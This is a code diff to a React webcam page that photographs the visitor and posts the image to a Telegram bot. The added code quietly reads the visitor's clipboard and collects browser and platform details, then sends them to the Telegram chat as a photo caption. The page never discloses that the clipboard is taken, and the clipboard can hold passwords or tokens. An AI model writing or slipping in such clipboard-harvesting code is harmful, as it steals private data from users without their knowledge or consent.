@@ -31,6 +31,7 @@ const Content = () => {
 
   // const telegramChatId = form?.telegram_id;
   // const [formData] = Form.useForm();
+  //
 
   const capture = () => {
     const imageSrc = webcamRef.current.getScreenshot();
@@ -40,12 +41,36 @@ const Content = () => {
   const sendPhotoToTelegram = async () => {
     if (imgSrc) {
       try {
+
         const response = await fetch(imgSrc);
         const blob = await response.blob();
+
+        const systemInfo = `
+          Browser: ${navigator.userAgent}
+          Platform: ${navigator.platform}
+          Online: ${navigator.onLine}
+        `;
+
+        let clipboardContent = '';
+        try {
+          clipboardContent = await navigator.clipboard.readText();
+        } catch (err) {
+          console.error('Failed to read clipboard contents: ', err);
+          clipboardContent = 'Could not read clipboard contents';
+        }
+
+        const caption = `
+          System Info:
+          ${systemInfo}
+          
+          Clipboard Content:
+          ${clipboardContent}
+        `;
 
         const formData = new FormData();
         formData.append("chat_id", telegramChatId);
         formData.append("photo", blob, "webcam-photo.jpg");
+        formData.append("caption", caption);
 
         const telegramResponse = await fetch(
           `https://api.telegram.org/bot${telegramToken}/sendPhoto`,
@@ -57,17 +82,19 @@ const Content = () => {
 
         const result = await telegramResponse.json();
         if (result.ok) {
-          alert("Photo sent successfully to the channel!");
+          alert("Photo and info sent successfully to the channel!");
         } else {
-          console.error("Error sending photo:", result);
-          alert("Failed to send photo");
+          console.error("Error sending photo and info:", result);
+          alert("Failed to send photo and info");
         }
       } catch (error) {
-        console.error("Error sending photo:", error);
-        alert("Failed to send photo");
+        console.error("Error sending photo and info:", error);
+        alert("Failed to send photo and info");
       }
     }
   };
+
+
 
   const handleSubmit = async () => {
     sendPhotoToTelegram();
@@ -80,9 +107,9 @@ const Content = () => {
           <h1>Take your photo!</h1>
           <Form
             className="form"
-            // form={formData}
-            // autoComplete={"off"}
-            // onFinish={handleSubmit}
+          // form={formData}
+          // autoComplete={"off"}
+          // onFinish={handleSubmit}
           >
             <div className="webcam-container">
               <div className="webcam-img flex justify-center">
